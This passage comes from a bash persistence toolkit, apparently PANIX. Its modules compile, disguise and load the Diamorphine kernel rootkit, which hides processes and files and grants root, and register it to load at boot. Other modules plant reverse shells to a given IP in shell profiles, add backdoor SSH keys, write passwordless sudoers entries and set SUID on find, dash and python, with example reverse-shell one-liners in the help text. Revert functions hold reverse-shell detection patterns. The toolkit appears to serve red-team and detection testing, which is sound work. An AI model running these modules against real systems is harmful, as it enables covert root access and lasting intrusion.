	sed -i -E "s/(MODULE_DESCRIPTION\\(\")[^\"]*(\"\\);)/\1${identifier}\2/" "${rk_path}/${identifier}.c"

	# Strings
	sed -i s/diamorphine_secret/${secret}/g ${rk_path}/${identifier}.h
	sed -i s/diamorphine/${identifier}/g ${rk_path}/${identifier}.h
	sed -i s/diamorphine.h/${identifier}.h/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine_init/${identifier}_init/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine_cleanup/${identifier}_cleanup/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine.o/${identifier}.o/g ${rk_path}/Makefile
	
	# Original functions
	sed -i s/orig_getdents64/${identifier}_orig_getdents64/g ${rk_path}/${identifier}.c
	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
	sed -i s/orig_kill/${identifier}_orig_kill/g ${rk_path}/${identifier}.c
	
	# Hooks
	sed -i s/module_hide/${identifier}_module_hide/g ${rk_path}/${identifier}.c
	sed -i s/module_hidden/${identifier}_module_hidden/g ${rk_path}/${identifier}.c
	sed -i s/is_invisible/${identifier}_invisible/g ${rk_path}/${identifier}.c
	sed -i s/hacked_getdents64/${identifier}_getdents64/g ${rk_path}/${identifier}.c
	sed -i s/hacked_getdents/${identifier}_getdents/g ${rk_path}/${identifier}.c
	sed -i s/hacked_kill/${identifier}_kill/g ${rk_path}/${identifier}.c
	sed -i s/give_root/${identifier}_give_root/g ${rk_path}/${identifier}.c
	sed -i s/is_invisible/${identifier}_is_invisible/g ${rk_path}/${identifier}.c

	# Compile, load and clean
	make -C ${rk_path}

	if [ $? -ne 0 ]; then
		echo "Error: Failed to compile the rootkit."
		exit 1
	fi

	if ! command -v insmod &> /dev/null; then
		/sbin/insmod ${rk_path}/${identifier}.ko
	else
		insmod ${rk_path}/${identifier}.ko
	fi

	if [ $? -ne 0 ]; then
		echo "Error: Failed to load the rootkit."
		exit 1
	fi

	make -C ${rk_path} clean
	touch ${rk_path}/restore_${identifier}.ko

	# Add kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
	echo "[+] Adding kernel module to /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d..."

	if [ -d "/etc/modules-load.d" ]; then
		echo "${identifier}" > /etc/modules-load.d/${identifier}.conf
	fi

	if [ -d "/usr/lib/modules-load.d" ]; then
		echo "${identifier}" > /usr/lib/modules-load.d/${identifier}.conf
	fi

	if [ -f "/etc/modules" ]; then
		if ! grep -q "^${identifier}$" /etc/modules; then
			echo "${identifier}" >> /etc/modules
		fi
	fi

	echo "[+] Diamorphine rootkit has been installed."
	echo "[+] The secret is: ${secret}"
	echo "[+] The identifier is: ${identifier}"

	echo "[+] kill -31 pid: hide/unhide any process;"
	echo "[+] kill -63 pid: turns the module (in)visible;"
	echo "[+] kill -64 pid: become root;"
	echo "[+] Any file starting with ${secret} is hidden."
	echo "[+] Source: https://github.com/m0nad/Diamorphine"
}

# Revert Module: revert_rootkit.sh
revert_rootkit() {
	usage_revert_rootkit() {
		echo "Usage: ./panix.sh --revert rootkit"
		echo "Reverts any changes made by the setup_rootkit module."
	}

	# Ensure the function is run as root
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Function to remove a file if it exists
	remove_file() {
		local file_path="$1"
		if [[ -f "$file_path" ]]; then
			rm -f "$file_path"
			echo "[+] Removed file: $file_path"
		else
			echo "[-] File not found: $file_path"
		fi
	}

	# Function to remove a directory if it exists
	remove_directory() {
		local dir_path="$1"
		if [[ -d "$dir_path" ]]; then
			rm -rf "$dir_path"
			echo "[+] Removed directory: $dir_path"
		else
			echo "[-] Directory not found: $dir_path"
		fi
	}

	# Function to send kill -63 0 to unload the module
	unload_module_signal() {
		echo "[+] Sending 'kill -63 0' to unload the rootkit module..."
		kill -63 0
		if [[ $? -ne 0 ]]; then
			echo "[-] Failed to send signal to unload the rootkit module."
			echo "You may need to unload it manually."
		else
			echo "[+] Signal sent successfully."
		fi
	}

	# Function to unload a kernel module
	unload_kernel_module() {
		local module_name="$1"
		if /sbin/lsmod | grep -q "^${module_name}\b"; then
			echo "[+] Unloading kernel module: $module_name"
			/sbin/rmmod -f "$module_name"
			if [[ $? -eq 0 ]]; then
				echo "[+] Kernel module '$module_name' unloaded successfully."
			else
				echo "[-] Failed to unload kernel module '$module_name'."
			fi
		else
			echo "[-] Kernel module '$module_name' is not loaded."
		fi
	}

	rk_path="/dev/shm/.rk"
	if [[ -d "$rk_path" ]]; then

		# Step 1: Send kill -63 0 signal to prepare unloading
		unload_module_signal

		# Step 2: Identify and unload kernel modules
		echo "[+] Identifying loaded rootkit kernel modules in $rk_path..."

		# Find rootkit name
		rk_name=/dev/shm/.rk/restore_*.ko
		rk_name=$(echo $rk_name | sed 's/restore_//g')
		rk_name=$(basename $rk_name .ko)

		# If rootkit was found, unload it, else, return
		if [[ -z "$rk_name" ]]; then
			echo "[-] Rootkit not found."
		else
			echo "[+] Unloading rootkit $rk_name..."
			unload_kernel_module "$rk_name"
			if [[ $? -eq 0 ]]; then
				echo "[+] Rootkit $rk_name unloaded successfully."
			else
				echo "[-] Failed to unload rootkit $rk_name."
			fi
		fi
	else
		echo "[-] Rootkit directory '$rk_path' not found. Skipping module unloading."
	fi

	# Step 3: Remove kernel module files
	if [[ -d "$rk_path" ]]; then
		echo "[+] Removing kernel module files from $rk_path..."
		for ko_file in "$rk_path"/*.ko; do
			if [[ -f "$ko_file" ]]; then
				remove_file "$ko_file"
			fi
		done
	fi

	# Remove the module from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/
	echo "[+] Removing rootkit module from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/..."
	if [ -d "/etc/modules-load.d" ]; then
		echo "${rk_name}" > /etc/modules-load.d/${rk_name}.conf
	fi

	if [ -d "/usr/lib/modules-load.d" ]; then
		echo "${rk_name}" > /usr/lib/modules-load.d/${rk_name}.conf
	fi

	if [ -f "/etc/modules" ]; then
		if grep -q "^${rk_name}$" /etc/modules; then
			sed -i "/^${rk_name}$/d" /etc/modules
		fi
	fi

	echo "[+] Rootkit module removed from /etc/modules, /etc/modules-load.d/ and /usr/lib/modules-load.d/"

	# Step 4: Remove /dev/shm/.rk directory
	remove_directory "$rk_path"

	# Step 5: Remove downloaded files in /tmp
	echo "[+] Removing downloaded files in /tmp..."
	remove_directory "/tmp/diamorphine"
	remove_file "/tmp/diamorphine.zip"
	remove_file "/tmp/diamorphine.tar"
	remove_directory "/tmp/Diamorphine.git"

	# Step 6: Reload kernel modules to ensure no remnants remain
	echo "[+] Reloading kernel modules..."
	/sbin/depmod -a
	if [[ $? -eq 0 ]]; then
		echo "[+] Kernel modules reloaded successfully."
	else
		echo "[-] Failed to reload kernel modules."
	fi

	return 0
}

# Module: setup_shell_profile.sh
setup_shell_profile() {
	local profile_path=""
	local command=""
	local custom=0
	local default=0
	local ip=""
	local port=""

	usage_shell_profile() {
		echo "Usage: ./panix.sh --shell-profile [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default shell profile settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom shell profile settings (make sure they are valid!)"
		echo "  --path <path>                Specify custom profile path"
		echo "  --command <command>          Specify custom persistence command (no validation)"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--path )
				shift
				profile_path=$1
				;;
			--command )
				shift
				command=$1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --shell-profile --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --shell-profile --custom --command \"(nohup bash -i > /dev/tcp/10.10.10.10/1337 0<&1 2>&1 &)\" --path \"/root/.bash_profile\""
				exit 0
				;;
			--help|-h)
				usage_shell_profile
				exit 0
				;;
			* )
				echo "Invalid option for --shell-profile: $1"
				echo "Try './panix.sh --shell-profile --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --shell-profile --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if [[ -z $ip || -z $port ]]; then
			echo "Error: --ip and --port must be specified when using --default."
			echo "Try './panix.sh --shell-profile --help' for more information."
			exit 1
		fi

		if check_root; then
			profile_path="/etc/profile"
		else
			local current_user=$(whoami)
			profile_path="/home/$current_user/.bash_profile"
		fi

		echo "(nohup bash -i > /dev/tcp/$ip/$port 0<&1 2>&1 &)" >> $profile_path
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $profile_path || -z $command ]]; then
			echo "Error: --path and --command must be specified when using --custom."
			echo "Try './panix.sh --shell-profile --help' for more information."
			exit 1
		fi

		echo "$command" >> $profile_path
	else
		echo "Error: Either --default or --custom must be specified for --profile."
		echo "Try './panix.sh --shell-profile --help' for more information."
		exit 1
	fi

	echo "[+] Shell profile persistence established!"
}

# Revert Module: revert_shell_profile.sh
revert_shell_profile() {
	usage_revert_shell_profile() {
		echo "Usage: ./panix.sh --revert shell-profile"
		echo "Reverts any changes made by the setup_shell_profile module."
	}

	# Determine if the script is run as root
	if [[ "$(id -u)" -eq 0 ]]; then
		is_root=true
	else
		is_root=false
	fi

	# Function to backup a file if not already backed up
	backup_file() {
		local file_path="$1"
		if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
			cp "$file_path" "${file_path}.backup"
			echo "[+] Backup of $file_path created at ${file_path}.backup"
		elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
			echo "[+] Backup of $file_path already exists at ${file_path}.backup"
		else
			echo "[-] File not found: $file_path. Skipping backup."
		fi
	}

	remove_lines_matching_pattern() {
		local pattern="$1"
		local file="$2"

		# Use '|' as the delimiter in sed to avoid conflict with '/'
		if grep -q "$pattern" "$file"; then
			sed -i "\|$pattern|d" "$file"
			echo "[+] Removed lines matching pattern: '$pattern' from $file"
		fi
	}

	# Define shell profile files to check
	system_shell_profiles=(
		"/etc/profile"
		"/etc/bash.bashrc"
		"/etc/zsh/zshrc"
		"/etc/profile.d/*.sh"
	)

	user_shell_profiles=(
		"$HOME/.bash_profile"
		"$HOME/.bashrc"
		"$HOME/.profile"
		"$HOME/.zshrc"
	)

	# Define malicious patterns indicative of a reverse shell
	malicious_patterns=(
		"nohup bash -i > /dev/tcp/"
		"setsid nohup bash -c 'bash -i >& /dev/tcp/"
		"bash -i >& /dev/tcp/"
		"bash -c 'sh -i >& /dev/tcp/"
		"bash -i > /dev/tcp/"
		"sh -i >& /dev/udp/"
		"bash -c 'bash -i >& /dev/tcp/"
		"bash -c 'sh -i >& /dev/udp/"
		"nohup setsid bash -c 'sh -i >& /dev/tcp/"
		"nohup setsid sh -c 'sh -i >& /dev/tcp/"
		"nohup setsid"
	)

	# Define system users to skip (modify this array if certain users should not be processed)
	system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")

	# Function to check if a user is a system user
	is_system_user() {
		local user="$1"
		for sys_user in "${system_users[@]}"; do
			if [[ "$user" == "$sys_user" ]]; then
				return 0
			fi
		done
		return 1
	}

	# Function to process a single user's shell profiles
	process_user_shell_profiles() {
		local user_home="$1"
		local user_name="$2"

		echo "[+] Processing shell profiles for user '$user_name' at: $user_home"

		for profile in "${user_shell_profiles[@]}"; do
			# Replace $HOME with the actual user home directory
			local expanded_profile="${profile/#\$HOME/$user_home}"

			if [[ -f "$expanded_profile" ]]; then
				backup_file "$expanded_profile"
				for pattern in "${malicious_patterns[@]}"; do
					remove_lines_matching_pattern "$pattern" "$expanded_profile"
				done
			else
				echo "[-] Shell profile file not found: $expanded_profile. Skipping."
			fi
		done
	}

	# Function to process system-wide shell profiles
	process_system_shell_profiles() {
		echo "[+] Processing system-wide shell profiles."

		for profile in "${system_shell_profiles[@]}"; do
			# Handle wildcard profiles like /etc/profile.d/*.sh
			if [[ "$profile" == *.sh ]]; then
				for script in $profile; do
					if [[ -f "$script" ]]; then
						backup_file "$script"
						for pattern in "${malicious_patterns[@]}"; do
							remove_lines_matching_pattern "$pattern" "$script"
						done
					fi
				done
				continue
			fi

			if [[ -f "$profile" ]]; then
				echo "[+] Processing shell profile file: $profile"
				backup_file "$profile"
				for pattern in "${malicious_patterns[@]}"; do
					remove_lines_matching_pattern "$pattern" "$profile"
				done
			else
				echo "[-] Shell profile file not found: $profile. Skipping."
			fi
		done
	}

	# Main logic based on execution context
	if [[ "$is_root" == true ]]; then
		echo "[+] Running as root. Reverting shell profiles for root and all non-system users."

		# Revert system-wide shell profiles
		process_system_shell_profiles

		# Iterate over all user directories in /home
		for user_home in /home/*; do
			if [[ -d "$user_home" ]]; then
				user_name=$(basename "$user_home")
				if is_system_user "$user_name"; then
					echo "[-] Skipping system user '$user_name'."
					continue
				fi
				process_user_shell_profiles "$user_home" "$user_name"
			fi
		done
	else
		# Non-root execution: revert shell profiles for the current user only
		current_user=$(whoami)
		user_home=$(eval echo "~$current_user")
		echo "[+] Running as non-root. Reverting shell profiles for user '$current_user' at: $user_home"

		process_user_shell_profiles "$user_home" "$current_user"
	fi

	echo "[+] Shell profiles reverted successfully."
	echo "[!] Restart your shell sessions to apply changes."
	echo "[!] Run 'source /etc/profile' to apply changes system-wide (if applicable)."
	echo "[!] Run 'source ~/.bash_profile' or 'source ~/.bashrc' to apply changes to your user session."
	echo "[!] Run 'exec bash' or 'exec zsh' to restart the current shell session."

	return 0
}

# Module: setup_ssh_key.sh
setup_ssh_key() {
	local default=0
	local custom=0
	local target_user=""
	local ssh_dir=""
	local ssh_key_path=""

	usage_ssh_key() {
		if check_root; then
			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
			echo "--custom                     Use custom SSH key settings"
			echo "  --user <user>               Specify user for custom SSH key"
		    echo "--help|-h                    Show this help message"
		else
			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
		    echo "--help|-h                    Show this help message"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--user )
				shift
				target_user=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --ssh-key --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --ssh-key --custom --user victim"
				exit 0
				;;
			--help|-h)
				usage_ssh_key
				exit 0
				;;
			* )
				echo "Invalid option for --ssh-key: $1"
				echo "Try './panix.sh --ssh-key --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v ssh-keygen &> /dev/null; then
		echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --ssh-key --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if check_root; then
			ssh_dir="/root/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		else
			local current_user=$(whoami)
			ssh_dir="/home/$current_user/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		fi

		mkdir -p $ssh_dir
		ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
		cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
		echo "SSH key generated:"
		echo "Private key: $ssh_key_path"
		echo "Public key: ${ssh_key_path}.pub"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $target_user ]]; then
			echo "Error: --user must be specified when using --custom."
			echo "Try './panix.sh --ssh-key --help' for more information."
			exit 1
		fi

		if id -u $target_user &>/dev/null; then
			local user_home=$(eval echo ~$target_user)
			ssh_dir="$user_home/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"

			mkdir -p $ssh_dir
			chown $target_user:$target_user $ssh_dir
			sudo -u $target_user ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
			cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
			chown $target_user:$target_user $ssh_key_path $ssh_key_path.pub $ssh_dir/authorized_keys
			echo "SSH key generated for $target_user:"
			echo "Private key: $ssh_key_path"
			echo "Public key: ${ssh_key_path}.pub"
		else
			echo "Error: User $target_user does not exist."
			exit 1
		fi
	else
		echo "Error: Either --default or --custom must be specified for --ssh-key."
		echo "Try './panix.sh --ssh-key --help' for more information."
		exit 1
	fi

	echo "[+] SSH key persistence established!"
}

# Revert Module: revert_ssh_key.sh
revert_ssh_key() {
    usage_revert_ssh_key() {
        echo "Usage: ./panix.sh --revert ssh-key"
        echo "Reverts any changes made by the setup_ssh_key module."
    }

    # Determine if the script is run as root
    if [[ "$(id -u)" -eq 0 ]]; then
        is_root=true
    else
        is_root=false
    fi

    # Function to backup a file if not already backed up
    backup_file() {
        local file_path="$1"
        if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
            cp "$file_path" "${file_path}.backup"
            echo "[+] Backup of $file_path created at ${file_path}.backup"
        elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
            echo "[!] Backup of $file_path already exists at ${file_path}.backup"
        else
            echo "[-] File not found: $file_path. Skipping backup."
        fi
    }

    # Function to remove a file if it exists
    remove_file() {
        local file_path="$1"
        if [[ -f "$file_path" ]]; then
            rm -f "$file_path"
            echo "[+] Removed file: $file_path"
        else
            echo "[-] File not found: $file_path"
        fi
    }

    # Function to remove a public key from authorized_keys
    remove_public_key() {
        local pub_key_content="$1"
        local auth_keys="$2"
        if grep -Fq "$pub_key_content" "$auth_keys"; then
            sed -i "\|$pub_key_content|d" "$auth_keys"
            echo "[+] Removed public key from: $auth_keys"
        else
            echo "[-] Public key not found in: $auth_keys"
        fi
    }

    # Function to process a single user's SSH keys
    process_user_ssh_keys() {
        local user_home="$1"
        local user_name="$2"

        local ssh_dir="$user_home/.ssh"
        local private_key_path="$ssh_dir/id_rsa1822"
        local public_key_path="$ssh_dir/id_rsa1822.pub"
        local authorized_keys_path="$ssh_dir/authorized_keys"

        # Check if .ssh directory exists
        if [[ ! -d "$ssh_dir" ]]; then
            echo "[-] .ssh directory not found for user '$user_name' at: $ssh_dir. Skipping."
            return
        fi

        # Backup authorized_keys
        if [[ -f "$authorized_keys_path" ]]; then
            backup_file "$authorized_keys_path"
        else
            echo "[-] authorized_keys file not found at: $authorized_keys_path. Skipping backup."
        fi

        # Check if public key exists
        if [[ -f "$public_key_path" ]]; then
            # Read the public key content
            pub_key_content=$(cat "$public_key_path")

            # Remove the public key entry from authorized_keys
            if [[ -f "$authorized_keys_path" ]]; then
                remove_public_key "$pub_key_content" "$authorized_keys_path"
            else
                echo "[-] authorized_keys file not found at: $authorized_keys_path. Skipping removal of public key."
            fi

            # Remove the SSH key files
            remove_file "$private_key_path"
            remove_file "$public_key_path"

            # Optionally, remove the .ssh directory if it's empty
            if [[ -d "$ssh_dir" ]]; then
                if [[ -z "$(ls -A "$ssh_dir")" ]]; then
                    rm -rf "$ssh_dir"
                    echo "[+] Removed empty .ssh directory: $ssh_dir"
                else
                    echo "[+] .ssh directory not empty after removals: $ssh_dir"
                fi
            fi
        else
            echo "[-] Public key file not found at: $public_key_path. Skipping removal from authorized_keys."
        fi
    }

    # Define system users to skip (if any). Modify this array if certain users should not be processed.
    system_users=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "gnats" "nobody" "systemd-network" "systemd-resolve" "syslog" "messagebus" "uuidd" "dnsmasq" "usbmux" "rtkit" "cups-pk-helper" "dnsmasq-dhcp" "sshd" "polkitd")

    # Function to check if a user is a system user
    is_system_user() {
        local user="$1"
        for sys_user in "${system_users[@]}"; do
            if [[ "$user" == "$sys_user" ]]; then
                return 0
            fi
        done
        return 1
    }

    # Collect users to process
    users_to_process=()

    if [[ "$is_root" == true ]]; then
        echo "[+] Running as root. Reverting SSH keys for root and all non-system users."

        # Add root user
        users_to_process+=("root")

        # Iterate over all user directories in /home
        for user_home in /home/*; do
            if [[ -d "$user_home" ]]; then
                user_name=$(basename "$user_home")
                if is_system_user "$user_name"; then
                    echo "[-] Skipping system user '$user_name'."
                    continue
                fi
                users_to_process+=("$user_name")
            fi
        done
    else
        # Non-root execution: process only the current user
        current_user=$(whoami)
        echo "[+] Running as non-root. Reverting SSH keys for user '$current_user'."
        users_to_process+=("$current_user")
    fi

    # Process each user
    for user in "${users_to_process[@]}"; do
        if [[ "$user" == "root" ]]; then
            user_home="/root"
        else
            user_home="/home/$user"
        fi

        echo "[+] Processing SSH keys for user '$user' at: $user_home/.ssh"
        process_user_ssh_keys "$user_home" "$user"
    done

    return 0
}

# Module: setup_sudoers_backdoor.sh
setup_sudoers_backdoor() {
	local username=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_sudoers_backdoor() {
		echo "Usage: ./panix.sh --sudoers-backdoor [OPTIONS]"
		echo "--examples                 Display command examples"
		echo "--username <username>      Specify the username"
		echo "--help|-h                  Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--username )
				shift
				username=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --sudoers --username <username>"
				exit 0
				;;
			--help|-h)
				usage_sudoers_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --sudoers-backdoor: $1"
				echo "Try './panix.sh --sudoers-backdoor --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $username ]]; then
		echo "Error: --username must be specified."
		echo "Try './panix.sh --sudoers-backdoor --help' for more information."
		exit 1
	fi

	echo "$username ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/$username

	if [[ $? -eq 0 ]]; then
		echo "[+] User $username can now run all commands without a sudo password."
	else
		echo "[-] Failed to create sudoers backdoor for user $username."
		exit 1
	fi
	echo "[+] Sudoers backdoor persistence established!"
}

# Revert Module: revert_sudoers_backdoor.sh
revert_sudoers() {
	usage_revert_sudoers() {
		echo "Usage: ./panix.sh --revert sudoers"
		echo "Reverts any changes made by the setup_sudoers_backdoor module."
	}

	# Ensure the function is run as root
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Function to backup a file if not already backed up
	backup_file() {
		local file_path="$1"
		if [[ -f "$file_path" && ! -f "${file_path}.backup" ]]; then
			cp "$file_path" "${file_path}.backup"
			echo "[+] Backup of $file_path created at ${file_path}.backup"
		elif [[ -f "$file_path" && -f "${file_path}.backup" ]]; then
			echo "[!] Backup of $file_path already exists at ${file_path}.backup"
		else
			echo "[-] File not found: $file_path. Skipping backup."
		fi
	}

	# Function to remove a sudoers backdoor file
	remove_sudoers_backdoor() {
		local sudoers_file="$1"

		if [[ -f "$sudoers_file" && "$sudoers_file" != *.backup ]]; then
			# Backup the sudoers file before removal
			backup_file "$sudoers_file"

			# Remove the sudoers backdoor
			rm -f "$sudoers_file"
			if [[ $? -eq 0 ]]; then
				echo "[+] Removed sudoers backdoor file: $sudoers_file"
			else
				echo "[-] Failed to remove sudoers backdoor file: $sudoers_file"
			fi
		else
			echo "[-] Sudoers backdoor file not found: $sudoers_file. Skipping."
		fi
	}

	# Define the sudoers backdoor pattern
	sudoers_pattern='^[a-zA-Z0-9._-]+ ALL=\(ALL\) NOPASSWD:ALL$'

	# Iterate over all files in /etc/sudoers.d/
	for sudoers_file in /etc/sudoers.d/*; do
		# Ensure it's a regular file
		if [[ -f "$sudoers_file" ]]; then
			# Check if the file contains any lines matching the sudoers backdoor pattern
			if grep -Eq "$sudoers_pattern" "$sudoers_file"; then
				echo "[+] Identified sudoers backdoor in file: $sudoers_file"
				remove_sudoers_backdoor "$sudoers_file"
			else
				echo "[-] No sudoers backdoor found in file: $sudoers_file. Skipping."
			fi
		else
			echo "[-] Not a regular file: $sudoers_file. Skipping."
		fi
	done

	return 0
}

# Module: setup_suid_backdoor.sh
setup_suid_backdoor() {
	local default=0
	local custom=0
	local binary=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_suid_backdoor() {
		echo "Usage: ./panix.sh --suid [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default SUID settings"
		echo "--custom                     Use custom SUID settings"
		echo "  --binary <binary>            Specify the binary to give SUID permissions"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--binary )
				shift
				binary=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --suid --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --suid --custom --binary \"/bin/find\""
				exit 0
				;;
			--help|-h)
				usage_suid_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --suid: $1"
				echo "Try './panix.sh --suid --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
		echo "Try './panix.sh --suid --help' for more information."
		exit 1
	fi

	if [[ $default -eq 1 ]]; then
		local binaries=("find" "dash" "python" "python3")

		for bin in "${binaries[@]}"; do
			if command -v $bin &> /dev/null; then
				local path=$(command -v $bin)
				# Resolve symbolic links to get the real path
				path=$(realpath $path)
				chmod u+s $path
				if [[ $? -eq 0 ]]; then
					echo "[+] SUID privilege granted to $path"
				else
					echo "[-] Failed to grant SUID privilege to $path"
				fi
			else
				echo "[-] $bin is not present on the system."
			fi
		done
	elif [[ $custom -eq 1 ]]; then
		if [[ -z $binary ]]; then
			echo "Error: --binary must be specified with --custom."
			echo "Try './panix.sh --suid --help' for more information."
			exit 1
		fi

		if command -v $binary &> /dev/null; then
			local path=$(command -v $binary)
			# Resolve symbolic links to get the real path
			path=$(realpath $path)
			chmod u+s $path
			if [[ $? -eq 0 ]]; then
				echo "[+] SUID privilege granted to $path"
			else
				echo "[-] Failed to grant SUID privilege to $path"
			fi
		else
			echo "[-] $binary is not present on the system."
		fi
	fi
	echo "[+] SUID backdoor persistence established!"
}

# Revert Module: revert_suid_backdoor.sh
revert_suid() {
	usage_revert_suid() {
		echo "Usage: ./panix.sh --revert suid"
		echo "Reverts any changes made by the setup_suid_backdoor module."
	}

	# Ensure the function is run as root
	if ! check_root; then
		echo "Error: This function can only be run as root."
		return 1
	fi

	# Define the default binaries that had SUID bits set
	default_binaries=("find" "dash" "python" "python3")

	# Function to remove SUID bit from a binary
	remove_suid_bit() {
		local binary_path="$1"
		if [[ -f "$binary_path" ]]; then
			chmod u-s "$binary_path"
			if [[ $? -eq 0 ]]; then
				echo "[+] Removed SUID bit from $binary_path"
			else
				echo "[-] Failed to remove SUID bit from $binary_path"
			fi
		else
			echo "[-] Binary not found: $binary_path. Skipping."
		fi
	}

	# Function to revert SUID for default binaries
	revert_default_suid() {
		echo "[+] Reverting SUID bits on default binaries..."

		for bin in "${default_binaries[@]}"; do
			if command -v "$bin" &> /dev/null; then
				bin_path=$(command -v "$bin")
				# Resolve symbolic links to get the real path
				real_bin_path=$(realpath "$bin_path")
				remove_suid_bit "$real_bin_path"
			else
				echo "[-] Binary '$bin' not found on the system. Skipping."
			fi
		done
	}

	# Revert default SUID bits
	revert_default_suid

	return 0
}

# Module: setup_system_binary_backdoor.sh
setup_system_binary_backdoor() {
	local default=0
	local custom=0
	local warning=0
	local ip=""
	local port=""
	local binary=""
	local command=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

	usage_system_binary_backdoor() {
		echo "Usage: ./panix.sh --system-binary [OPTIONS]"
		echo "--examples                   Display command examples"
		echo "--default                    Use default system binary backdoor settings"
		echo "  --ip <ip>                    Specify IP address"
		echo "  --port <port>                Specify port number"
		echo "--custom                     Use custom system binary backdoor settings"
		echo "  --binary <binary>            Specify the binary to backdoor"
		echo "  --command <command>          Specify the custom command to execute"
		echo "  --warning                    This may interrupt your system.. Be careful!"
		echo "--help|-h                    Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--warning )
				warning=1
				;;
			--ip )
				shift
				ip=$1
				;;
			--port )
				shift
				port=$1
				;;
			--binary )
				shift
				binary=$1
				;;
			--command )
				shift
				command=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "sudo ./panix.sh --system-binary --default --ip 10.10.10.10 --port 1337"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --system-binary --custom --binary \"/bin/cat\" --command \"/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337'\" --warning"
				exit 0
				;;
			--help|-h)
				usage_system_binary_backdoor
				exit 0
				;;
			* )
				echo "Invalid option for --system-binary-backdoor: $1"
				echo "Try './panix.sh --system-binary --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --system-binary --help' for more information."
		exit 1
	fi

	if [[ $default -eq 0 && $custom -eq 0 ]]; then
		echo "Error: Either --default or --custom must be specified."
